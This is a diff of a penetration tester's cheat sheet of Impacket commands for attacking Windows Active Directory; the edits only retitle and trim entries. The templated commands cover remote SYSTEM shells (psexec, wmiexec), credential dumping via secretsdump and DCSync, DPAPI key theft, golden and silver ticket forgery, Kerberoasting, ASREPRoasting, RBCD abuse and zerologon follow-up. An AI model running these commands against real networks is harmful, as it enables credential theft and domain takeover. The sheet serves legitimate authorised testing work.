@@ -52,11 +52,9 @@ fi
 
 ### psexec
 
-Spawn psexec with Impacket.
-
 SYSTEM shell on the target via the classic psexec service primitive (drops binary to ADMIN$, registers a service, runs it). Loud but reliable.
 
-```sh title:"Impacket Spawn Psexec"
+```sh title:"Impacket SYSTEM shell via service primitive"
 psexec.py $auth_target $auth_flags -service-name $service_name $ps_exec_template
 ```
 <!-- cheat
@@ -71,11 +69,9 @@ var service_name
 
 ### smbexec
 
-Spawn smbexec with Impacket.
-
 Semi-interactive SYSTEM shell via service exec, but no writable share needed. Output is read back via SMB pipes.
 
-```sh title:"Impacket Spawn Smbexec"
+```sh title:"Impacket Semi-interactive SYSTEM shell, no writable share needed"
 smbexec.py $auth_target $auth_flags -service-name $service_name
 ```
 <!-- cheat
@@ -89,11 +85,9 @@ var service_name
 
 ### atexec
 
-Execute atexec with Impacket.
-
 Run a single command on the target via the Task Scheduler service. No writable share needed; runs as SYSTEM.
 
-```sh title:"Impacket Execute Atexec"
+```sh title:"Impacket Single command via Task Scheduler"
 atexec.py $auth_target $auth_flags $commands_template
 ```
 <!-- cheat
@@ -107,11 +101,9 @@ import impacket_auth
 
 ### wmiexec
 
-Spawn wmiexec with Impacket.
-
 Shell as the authenticated user (not SYSTEM) over WMI. Quieter than psexec/smbexec since no service is registered.
 
-```sh title:"Impacket Spawn Wmiexec"
+```sh title:"Impacket WMI shell as user, no service registered"
 wmiexec.py $auth_target $auth_flags $commands_template
 ```
 <!-- cheat
@@ -125,11 +117,9 @@ import impacket_auth
 
 ### dcomexec
 
-Spawn dcomexec with Impacket.
-
 Semi-interactive shell via DCOM objects. Useful when WMI/SCM paths are noisy or blocked; `MMC20` is the most common object when no interactive user session exists.
 
-```sh title:"Impacket Spawn Dcomexec"
+```sh title:"Impacket DCOM shell or command execution"
 dcomexec.py $auth_target $auth_flags -object $dcom_object $commands_template
 ```
 <!-- cheat
@@ -142,11 +132,9 @@ var dcom_object = printf 'MMC20\nShellWindows\nShellBrowserWindow\n' --- --heade
 
 ### dcomexec no output
 
-Execute dcomexec no output with Impacket.
-
 Run a single command without fetching output over SMB.
 
-```sh title:"Impacket Execute Dcomexec No Output"
+```sh title:"Impacket DCOM silent command, no SMB output retrieval"
 dcomexec.py $auth_target $auth_flags -object $dcom_object -silentcommand -nooutput $commands_template
 ```
 <!-- cheat
@@ -161,11 +149,9 @@ var dcom_object = printf 'MMC20\nShellWindows\nShellBrowserWindow\n' --- --heade
 
 ### secretsdump
 
-Dump secretsdump with Impacket.
-
 Dump SAM, LSA, cached creds, and (with DCSync rights) NTDS.dit hashes from a remote host.
 
-```sh title:"Impacket Dump Secretsdump"
+```sh title:"Impacket Dump SAM/LSA/NTDS via DRSUAPI"
 secretsdump.py $auth_target $auth_flags $secrets_dump_templates
 ```
 <!-- cheat
@@ -177,11 +163,9 @@ import impacket_auth
 
 ### dpapi backup key
 
-Dump DPAPI backup key with Impacket.
-
 Retrieve the domain DPAPI backup key from a DC. This PVK can decrypt domain users' DPAPI masterkeys offline.
 
-```sh title:"Impacket Dump DPAPI Backup Key"
+```sh title:"Impacket Export domain DPAPI backup key"
 dpapi.py backupkeys -t $auth_target $auth_flags -export
 ```
 <!-- cheat
@@ -192,11 +176,9 @@ import impacket_auth
 
 ### dpapi masterkey with backup key
 
-Dump DPAPI masterkey with backup key with Impacket.
-
 Decrypt a DPAPI masterkey with the domain backup key.
 
-```sh title:"Impacket Dump DPAPI Masterkey with Backup Key"
+```sh title:"Impacket Decrypt DPAPI masterkey with backup key"
 dpapi.py masterkey -file $masterkey_file -pvk $backup_key_pvk
 ```
 <!-- cheat
@@ -206,11 +188,9 @@ var backup_key_pvk
 
 ### dpapi credential blob
 
-Dump DPAPI credential blob with Impacket.
-
 Decrypt a DPAPI Credential Manager blob once you have the plaintext masterkey.
 
-```sh title:"Impacket Dump DPAPI Credential Blob"
+```sh title:"Impacket Decrypt DPAPI credential file with masterkey"
 dpapi.py credential -file $credential_file -key $masterkey
 ```
 <!-- cheat
@@ -220,11 +200,9 @@ var masterkey
 
 ### regsecrets
 
-Dump regsecrets with Impacket.
-
 Dump SAM, cached domain credentials, and LSA secrets remotely through registry access. Lighter than full `secretsdump` when you do not need NTDS.
 
-```sh title:"Impacket Dump Regsecrets"
+```sh title:"Impacket Dump SAM/cache/LSA via remote registry"
 regsecrets.py $auth_target $auth_flags -outputfile $output_prefix
 ```
 <!-- cheat
@@ -238,11 +216,9 @@ var output_prefix
 
 ### getTGT
 
-Run getTGT with Impacket.
-
 Request a Kerberos TGT for `$user` and write a ccache. Set `KRB5CCNAME` to the file before running Kerberos-aware tooling.
 
-```sh title:"Impacket Run GetTGT"
+```sh title:"Impacket Request TGT to ccache"
 getTGT.py $auth_target $auth_flags
 ```
 <!-- cheat
@@ -255,11 +231,9 @@ import impacket_domain_auth
 
 ### smbclient
 
-Run smbclient with Impacket.
-
 Interactive SMB client for browsing shares and pulling files.
 
-```sh title:"Impacket Run Smbclient"
+```sh title:"Impacket Interactive SMB browser"
 smbclient.py $auth_target $auth_flags
 ```
 <!-- cheat
@@ -272,11 +246,9 @@ import impacket_auth
 
 ### mssqlclient
 
-Run mssqlclient with Impacket.
-
 Interactive MSSQL client over Windows auth. Useful for `EXEC xp_cmdshell` and SQL-side enumeration.
 
-```sh title:"Impacket Run Mssqlclient"
+```sh title:"Impacket Interactive MSSQL via Windows auth"
 mssqlclient.py -windows-auth $auth_target $auth_flags
 ```
 <!-- cheat
@@ -289,11 +261,9 @@ import impacket_auth
 
 ### kirbi to ccache
 
-Convert kirbi to ccache with Impacket.
-
 Convert a Rubeus-style `.kirbi` ticket into a Linux ccache and export `KRB5CCNAME`. Bridges Windows-side ticket extraction into impacket workflows.
 
-```sh title:"Impacket Convert Kirbi to Ccache"
+```sh title:"Impacket Convert .kirbi to ccache and export KRB5CCNAME"
 ticketConverter.py $file ticket.ccache; export KRB5CCNAME=ticket.ccache
 ```
 <!-- cheat
@@ -304,11 +274,9 @@ import files
 
 ### Forge silver ticket
 
-Dump forge silver ticket with Impacket.
-
 Forge a Kerberos service ticket for a specific SPN with the service account's NT hash. Lets you access just that service without ever talking to the KDC.
 
-```sh title:"Impacket Dump Forge Silver Ticket"
+```sh title:"Impacket Forge silver ticket for one SPN with service NT hash"
 ticketer.py -nthash $nthash -domain-sid $domain_sid -domain $domain -spn '$spn/$rhost_name:$group_id' $name
 ```
 <!-- cheat
@@ -326,11 +294,9 @@ var domain_sid
 
 ### Ticket session key
 
-Read ticket session key with Impacket.
-
 Extract the session key from a ccache. Step 1 of the no-SPN targeted Kerberoast trick: set the target's NT hash to the session key so the ticket cracks instantly.
 
-```sh title:"Impacket Read Ticket Session Key"
+```sh title:"Impacket Read TGT session key from ccache for no-SPN roast"
 describeTicket.py $ccache_file | grep 'Ticket Session Key'
 ```
 <!-- cheat
@@ -341,11 +307,9 @@ var ccache_file
 
 ### Set NT hash to session key
 
-Set NT hash to session key with Impacket.
-
 Step 2 of the no-SPN roast: write the TGT session key as the controlled account's new NT hash so subsequent service tickets are encrypted with a known key and crack instantly.
 
-```sh title:"Impacket Set NT Hash to Session Key"
+```sh title:"Impacket Write session key as target NT hash (no-SPN roast step 2)"
 changepasswd.py -newhashes :$TGTSessionKey $auth_target $auth_flags
 ```
 <!-- cheat
@@ -357,21 +321,17 @@ var TGTSessionKey
 
 ### SMB server anonymous
 
-Dump SMB server anonymous with Impacket.
-
 Stand up an anonymous SMB server hosting the current directory. Modern Windows often refuses anonymous mounts, so fall back to dummy creds if this fails.
 
-```sh title:"Impacket Dump SMB Server Anonymous"
+```sh title:"Impacket Anonymous SMB server hosting cwd, may be refused"
 smbserver.py share $(pwd) -smb2support
 ```
 
 ### SMB server with creds
 
-Dump SMB server with creds with Impacket.
-
 SMB server with dummy creds. Required when the target enforces signed/authenticated access.
 
-```sh title:"Impacket Dump SMB Server with Creds"
+```sh title:"Impacket SMB server with dummy creds, works under signing policy"
 smbserver.py share $(pwd) -smb2support -user $user -password $pass
 ```
 <!-- cheat
@@ -382,11 +342,9 @@ import passwords
 
 ### RaiseChild parent escalation
 
-Dump RaiseChild parent escalation with Impacket.
-
 Child to parent domain escalation via SID history injection. With Domain Admin in the child, forges a TGT for the parent and runs a command there.
 
-```sh title:"Impacket Dump RaiseChild Parent Escalation"
+```sh title:"Impacket Child to parent domain escalation via SID history"
 raiseChild.py -target-exec $rhost_ip $auth_target $auth_flags
 ```
 <!-- cheat
@@ -397,11 +355,9 @@ import impacket_domain_auth
 
 ### Domain SID lookup
 
-Dump domain SID lookup with Impacket.
-
 Look up the domain SID via MS-LSAT. Required for ticketer (golden/silver) and for SID-history attacks.
 
-```sh title:"Impacket Dump Domain SID Lookup"
+```sh title:"Impacket Resolve domain SID for ticketer and SID-history attacks"
 lookupsid.py $auth_target $auth_flags | grep "Domain SID"
 ```
 <!-- cheat
@@ -412,11 +368,9 @@ import impacket_auth
 
 ### Forge golden ticket
 
-Dump forge golden ticket with Impacket.
-
 Forge a TGT signed by the krbtgt NT hash with Enterprise Admins (RID 519) in extra-sids. Survives password resets except for krbtgt itself.
 
-```sh title:"Impacket Dump Forge Golden Ticket"
+```sh title:"Impacket Forge golden TGT with Enterprise Admins SID-519"
 ticketer.py -nthash $nthash -domain $domain -domain-sid $domain_sid -extra-sid $extra_sid-519 fakeuser
 ```
 <!-- cheat
@@ -431,11 +385,9 @@ var domain_sid
 
 ### Roast all SPNs
 
-Enable roast all SPNs with Impacket.
-
 Kerberoast every SPN-enabled account at once and print the krb5tgs hashes for offline cracking.
 
-```sh title:"Impacket Enable Roast All SPNs"
+```sh title:"Impacket Kerberoast every SPN-enabled account, print to stdout"
 GetUserSPNs.py -dc-ip $rhost_ip $auth_target $auth_flags -request
 ```
 <!-- cheat
@@ -446,11 +398,9 @@ import impacket_domain_auth
 
 ### Targeted Kerberoast
 
-Run targeted kerberoast with Impacket.
-
 Roast a single named account. Use after writing an SPN onto a target with bloodyAD/PowerView (targeted Kerberoasting).
 
-```sh title:"Impacket Run Targeted Kerberoast"
+```sh title:"Impacket Targeted Kerberoast a single named account"
 GetUserSPNs.py -dc-ip $rhost_ip $auth_target $auth_flags -request-user $target_user
 ```
 <!-- cheat
@@ -462,11 +412,9 @@ var target_user
 
 ### Targeted Kerberoast to file
 
-Dump targeted kerberoast to file with Impacket.
-
 Targeted Kerberoast and save the hash directly to a file ready for hashcat.
 
-```sh title:"Impacket Dump Targeted Kerberoast to File"
+```sh title:"Impacket Targeted Kerberoast, write hash to .hash file"
 GetUserSPNs.py -dc-ip $rhost_ip $auth_target $auth_flags -request-user $target_user -outputfile $target_user.hash
 ```
 <!-- cheat
@@ -478,11 +426,9 @@ var target_user
 
 ### Cross-domain SPN list
 
-List cross domain SPN list with Impacket.
-
 List SPNs in a different domain you have a trust into. Enumeration only, no ticket request.
 
-```sh title:"Impacket List Cross Domain SPN List"
+```sh title:"Impacket List SPNs in trusted/foreign domain, no roast"
 GetUserSPNs.py -target-domain $alt_domain $auth_target $auth_flags
 ```
 <!-- cheat
@@ -494,11 +440,9 @@ var alt_domain
 
 ### Cross-domain Kerberoast
 
-Run cross domain kerberoast with Impacket.
-
 Kerberoast across a trust into another domain. Pair with `-outputfile` if you want the hashes saved.
 
-```sh title:"Impacket Run Cross Domain Kerberoast"
+```sh title:"Impacket Kerberoast across trust into a foreign domain"
 GetUserSPNs.py -request -target-domain $alt_domain $auth_target $auth_flags
 ```
 <!-- cheat
@@ -510,11 +454,9 @@ var alt_domain
 
 ### Pre-auth-less Kerberoast
 
-List pre auth less kerberoast with Impacket.
-
 Kerberoast SPNs that don't require pre-auth (`UF_NO_AUTH_DATA_REQUIRED` / `DONT_REQ_PREAUTH`). Works without valid creds, given a userlist.
 
-```sh title:"Impacket List Pre Auth Less Kerberoast"
+```sh title:"Impacket Roast pre-auth-disabled SPNs from a userlist, no creds"
 GetUserSPNs.py -no-preauth $user -usersfile users.txt  -dc-host $rhost_name.$domain $domain/
 ```
 <!-- cheat
@@ -527,11 +469,9 @@ var domain
 
 ### Unauthenticated ASREPRoast
 
-Read unauthenticated ASREPRoast with Impacket.
-
 Spray a userlist with no creds and request AS-REPs for any user with `DONT_REQ_PREAUTH` set. Captures the AS-REP roastable hash for offline cracking.
 
-```sh title:"Impacket Read Unauthenticated ASREPRoast"
+```sh title:"Impacket ASREPRoast unauthenticated, spray userlist via GetNPUsers"
 GetNPUsers.py -dc-ip $rhost_ip $domain/ -usersfile $users_file -format hashcat -outputfile asreproast.out
 ```
 <!-- cheat
@@ -542,11 +482,9 @@ var domain
 
 ### Authenticated ASREPRoast
 
-Read authenticated ASREPRoast with Impacket.
-
 With valid creds, query LDAP for accounts with `DONT_REQ_PREAUTH` and request their AS-REPs.
 
-```sh title:"Impacket Read Authenticated ASREPRoast"
+```sh title:"Impacket Authenticated ASREPRoast via LDAP query"
 GetNPUsers.py -dc-ip $rhost_ip $auth_target $auth_flags -request -format hashcat -outputfile asreproast.out
 ```
 <!-- cheat
@@ -559,11 +497,9 @@ import impacket_domain_auth
 
 ### S4U2Self+S4U2Proxy impersonate
 
-Enumerate S4U2Self+S4U2Proxy impersonate with Impacket.
-
 Use a controlled service account's TGT to S4U-impersonate any user to a target service (`-spn cifs/$target`). Bread-and-butter step in RBCD and constrained-delegation abuse.
 
-```sh title:"Impacket Enumerate S4U2Self+S4U2Proxy Impersonate"
+```sh title:"Impacket S4U2Self+S4U2Proxy impersonate target user to a service"
 getST.py -spn cifs/$rhost_name $auth_target $auth_flags -impersonate $target_user
 ```
 <!-- cheat
@@ -578,11 +514,9 @@ var target_user
 
 ### goldenPac PAC forgery
 
-Execute goldenPac PAC forgery with Impacket.
-
 MS14-068: forge a PAC with Domain Admin privileges and exec a command via psexec. Only useful on unpatched DCs but trivial when applicable.
 
-```sh title:"Impacket Execute GoldenPac PAC Forgery"
+```sh title:"Impacket MS14-068 forged PAC psexec"
 goldenPac.py -dc-ip $rhost_ip $auth_target $auth_flags
 ```
 <!-- cheat
@@ -595,11 +529,9 @@ import impacket_auth
 
 ### List domain users
 
-List domain users with Impacket.
-
 Pull every user object with email addresses and metadata. Use after low-priv auth as quick AD recon for spraying / phishing prep.
 
-```sh title:"Impacket List Domain Users"
+```sh title:"Impacket Dump all domain users with email + metadata"
 GetADUsers.py -all $auth_target $auth_flags -dc-ip $rhost_ip
 ```
 <!-- cheat
@@ -612,11 +544,9 @@ import impacket_domain_auth
 
 ### List domain computers
 
-List domain computers with Impacket.
-
 Enumerate computer accounts through LDAP. Add `-resolveIP` when you want DNS lookups resolved through the DC.
 
-```sh title:"Impacket List Domain Computers"
+```sh title:"Impacket List domain computer accounts"
 GetADComputers.py $auth_target $auth_flags -dc-ip $rhost_ip -resolveIP
 ```
 <!-- cheat
@@ -629,11 +559,9 @@ import impacket_domain_auth
 
 ### Add machine account
 
-Add machine account with Impacket.
-
 Create a computer account when `ms-DS-MachineAccountQuota` allows it. Common first step for RBCD and shadow credential chains.
 
-```sh title:"Impacket Add Machine Account"
+```sh title:"Create computer account via Impacket addcomputer"
 addcomputer.py $auth_target $auth_flags -dc-ip $rhost_ip -computer-name "$computer_name$" -computer-pass $computer_pass
 ```
 <!-- cheat
@@ -648,11 +576,9 @@ var computer_pass
 
 ### Read target DACL
 
-Read target DACL with Impacket.
-
 Read ACEs from a target object over LDAP.
 
-```sh title:"Impacket Read Target DACL"
+```sh title:"Impacket Read AD object DACL"
 dacledit.py $auth_target $auth_flags -dc-ip $rhost_ip -target $target_object -action read
 ```
 <!-- cheat
@@ -664,11 +590,9 @@ var target_object
 
 ### Grant FullControl
 
-Run grant FullControl with Impacket.
-
 Write a FullControl ACE for a controlled principal on a target object.
 
-```sh title:"Impacket Run Grant FullControl"
+```sh title:"Impacket Grant FullControl with dacledit"
 dacledit.py $auth_target $auth_flags -dc-ip $rhost_ip -principal $controlled_object -target $target_object -action write -rights FullControl
 ```
 <!-- cheat
@@ -681,11 +605,9 @@ var target_object
 
 ### Grant DCSync
 
-Run grant DCSync with Impacket.
-
 Write DCSync replication rights on the domain object.
 
-```sh title:"Impacket Run Grant DCSync"
+```sh title:"Impacket Grant DCSync rights with dacledit"
 dacledit.py $auth_target $auth_flags -dc-ip $rhost_ip -principal $controlled_object -target-dn $domain_dn -action write -rights DCSync
 ```
 <!-- cheat
@@ -700,11 +622,9 @@ var domain_dn
 
 ### Change object owner
 
-Set change object owner with Impacket.
-
 Set a controlled principal as owner of a target object, then use `dacledit.py` to grant usable rights.
 
-```sh title:"Impacket Set Change Object Owner"
+```sh title:"Impacket Change AD object owner"
 owneredit.py $auth_target $auth_flags -dc-ip $rhost_ip -new-owner $controlled_object -target $target_object -action write
 ```
 <!-- cheat
@@ -719,11 +639,9 @@ var target_object
 
 ### Read RBCD
 
-Read RBCD with Impacket.
-
 Read the `msDS-AllowedToActOnBehalfOfOtherIdentity` security descriptor on a target computer.
 
-```sh title:"Impacket Read RBCD"
+```sh title:"Impacket Read target RBCD entries"
 rbcd.py $auth_target $auth_flags -dc-ip $rhost_ip -delegate-to "$target_computer$" -action read
 ```
 <!-- cheat
@@ -735,11 +653,9 @@ var target_computer
 
 ### Write RBCD
 
-Write RBCD with Impacket.
-
 Allow a controlled computer account to delegate to a target computer.
 
-```sh title:"Impacket Write RBCD"
+```sh title:"Impacket Write RBCD delegation entry"
 rbcd.py $auth_target $auth_flags -dc-ip $rhost_ip -delegate-from "$controlled_computer$" -delegate-to "$target_computer$" -action write
 ```
 <!-- cheat
@@ -754,11 +670,9 @@ var target_computer
 
 ### Enumerate delegation
 
-Enumerate delegation with Impacket.
-
 Enumerate unconstrained delegation, constrained delegation, and RBCD relationships in the domain.
 
-```sh title:"Impacket Enumerate Delegation"
+```sh title:"Impacket Enumerate AD delegation relationships"
 findDelegation.py $auth_target $auth_flags -dc-ip $rhost_ip
 ```
 <!-- cheat
@@ -771,11 +685,9 @@ import impacket_domain_auth
 
 ### Interactive LDAP shell
 
-Spawn interactive LDAP shell with Impacket.
-
 Open Impacket's LDAP shell for AD object reads and common modifications such as adding computers, changing passwords, and setting RBCD.
 
-```sh title:"Impacket Spawn Interactive LDAP Shell"
+```sh title:"Impacket Open interactive LDAP shell"
 ldap_shell.py $auth_target@$rhost_ip $auth_flags
 ```
 <!-- cheat
@@ -788,11 +700,9 @@ import impacket_domain_auth
 
 ### Check MachineAccountQuota
 
-Check MachineAccountQuota with Impacket.
-
 Read `ms-DS-MachineAccountQuota` to see whether regular users can create computer accounts.
 
-```sh title:"Impacket Check MachineAccountQuota"
+```sh title:"Impacket Check ms-DS-MachineAccountQuota"
 machineAccountQuota.py $auth_target $auth_flags -dc-ip $rhost_ip
 ```
 <!-- cheat
@@ -805,11 +715,9 @@ import impacket_domain_auth
 
 ### Dump readable LAPS passwords
 
-Dump readable LAPS passwords with Impacket.
-
 Read LAPS passwords from LDAP for computer objects the current principal can read.
 
-```sh title:"Impacket Dump Readable LAPS Passwords"
+```sh title:"Impacket Dump readable LAPS passwords"
 GetLAPSPassword.py $auth_target $auth_flags -dc-ip $rhost_ip -outputfile $output_file
 ```
 <!-- cheat
@@ -823,11 +731,9 @@ var output_file
 
 ### reg.py remote query
 
-Enumerate reg.py remote query with Impacket.
-
 Query a remote registry key over MS-RRP. Useful for grabbing GP cached creds, AutoLogon, WinLogon defaults from a host you can auth to.
 
-```sh title:"Impacket Enumerate Reg.py Remote Query"
+```sh title:"Impacket Query a remote registry key via reg.py"
 reg.py $auth_target $auth_flags query -keyName $reg_key -s
 ```
 <!-- cheat
@@ -839,11 +745,9 @@ var reg_key
 
 ### rpcdump endpoints
 
-Dump rpcdump endpoints with Impacket.
-
 List every RPC endpoint exposed on the target. Pair with coerce / vuln-RPC hunting.
 
-```sh title:"Impacket Dump Rpcdump Endpoints"
+```sh title:"Impacket List remote RPC endpoint mapper output"
 rpcdump.py $auth_target $auth_flags
 ```
 <!-- cheat
@@ -854,11 +758,9 @@ import impacket_auth
 
 ### services management
 
-Enumerate services management with Impacket.
-
 Remote service control (start/stop/create/delete/config) via MS-SCMR. Mirrors `sc` but driven from Linux.
 
-```sh title:"Impacket Enumerate Services Management"
+```sh title:"Impacket Manage a remote service (start/stop/create/...)"
 services.py $auth_target $auth_flags $action
 ```
 <!-- cheat
@@ -870,11 +772,9 @@ var action = printf '%s\n' 'list' 'status' 'config' 'start' 'stop' 'delete' 'cre
 
 ### getArch
 
-Probe getArch with Impacket.
-
 Probe MSRPC to determine whether the target is x64 or x86. Quick recon for picking the right payload format.
 
-```sh title:"Impacket Probe GetArch"
+```sh title:"Impacket Probe target architecture via MSRPC"
 getArch.py -target $rhost_ip
 ```
 <!-- cheat
@@ -883,11 +783,9 @@ import domain_ip
 
 ### netview enumeration
 
-List netview enumeration with Impacket.
-
 Enumerate shares, sessions, and logged-on users across targets. Requires working DNS resolution from the attacker box.
 
-```sh title:"Impacket List Netview Enumeration"
+```sh title:"Impacket Enumerate shares/sessions/users across a target list"
 netview.py $auth_target $auth_flags -target $rhost_ip -users $users_file
 ```
 <!-- cheat
@@ -899,11 +797,9 @@ var users_file
 
 ### samrdump SAM info
 
-Dump samrdump SAM info with Impacket.
-
 Pull info from the Security Account Manager (system accounts, shares, etc.) without a full DCSync.
 
-```sh title:"Impacket Dump Samrdump SAM Info"
+```sh title:"Impacket Dump local SAM info via MS-SAMR"
 samrdump.py $auth_target $auth_flags
 ```
 <!-- cheat
@@ -914,11 +810,9 @@ import impacket_auth
 
 ### DumpNTLMInfo
 
-Read DumpNTLMInfo with Impacket.
-
 Perform unauthenticated NTLM negotiation and print host/domain/build metadata plus SMB signing status.
 
-```sh title:"Impacket Read DumpNTLMInfo"
+```sh title:"Impacket Unauthenticated NTLM target fingerprint"
 DumpNTLMInfo.py $rhost_ip
 ```
 <!-- cheat
@@ -927,11 +821,9 @@ import domain_ip
 
 ### Check LDAP relay status
 
-Check LDAP relay status with Impacket.
-
 Check LDAP signing and channel binding enforcement on a DC to decide whether LDAP/LDAPS relay is viable.
 
-```sh title:"Impacket Check LDAP Relay Status"
+```sh title:"Impacket Check LDAP signing and channel binding"
 CheckLDAPStatus.py -dc-ip $rhost_ip -domain $domain
 ```
 <!-- cheat
@@ -943,11 +835,9 @@ var domain
 
 ### Local SAM offline
 
-Dump local SAM offline with Impacket.
-
 Crack the SAM+SYSTEM hive pair you've already exfiltrated. Useful after offline imaging or a `reg save` chain.
 
-```sh title:"Impacket Dump Local SAM Offline"
+```sh title:"Impacket Offline SAM dump from SYSTEM + SAM hives"
 secretsdump.py -system $system_hive -sam $sam_hive LOCAL
 ```
 <!-- cheat
@@ -957,11 +847,9 @@ var sam_hive
 
 ### Local NTDS offline
 
-Dump local NTDS offline with Impacket.
-
 Crack an NTDS.dit you've already exfiltrated. Pair with a SYSTEM hive copy taken from the same DC.
 
-```sh title:"Impacket Dump Local NTDS Offline"
+```sh title:"Impacket Offline NTDS.dit dump with SYSTEM hive"
 secretsdump.py -ntds $ntds_file -system $system_hive LOCAL -outputfile $output_prefix
 ```
 <!-- cheat
@@ -972,11 +860,9 @@ var output_prefix
 
 ### Zerologon anonymous DCSync
 
-Dump zerologon anonymous DCSync with Impacket.
-
 After zerologon (CVE-2020-1472), the DC machine account has an empty password. Pull just the Administrator hash anonymously.
 
-```sh title:"Impacket Dump Zerologon Anonymous DCSync"
+```sh title:"Impacket Anonymous DCSync after zerologon - Administrator only"
 secretsdump.py $domain/$dc_netbios\$@$rhost_ip -no-pass -just-dc-user Administrator
 ```
 <!-- cheat
@@ -987,11 +873,9 @@ var dc_netbios
 
 ### Just DC NTLM hashes
 
-Dump just DC NTLM hashes with Impacket.
-
 DCSync but only the NT hashes, to file. Faster and quieter than a full dump when you only need NTLM material.
 
-```sh title:"Impacket Dump Just DC NTLM Hashes"
+```sh title:"Impacket DCSync, just NTLM hashes, write to file"
 secretsdump.py -just-dc-ntlm -outputfile $output_prefix $auth_target $auth_flags
 ```
 <!-- cheat
@@ -1003,11 +887,9 @@ var output_prefix
 
 ### DCSync with metadata
 
-Dump DCSync with metadata with Impacket.
-
 DCSync with pwd-last-set and user-status alongside hashes. Cleaner for spotting stale accounts.
 
-```sh title:"Impacket Dump DCSync with Metadata"
+```sh title:"Impacket DCSync with pwd-last-set + user-status metadata"
 secretsdump.py -just-dc -pwd-last-set -user-status -outputfile $output_prefix $auth_target $auth_flags
 ```
 <!-- cheat
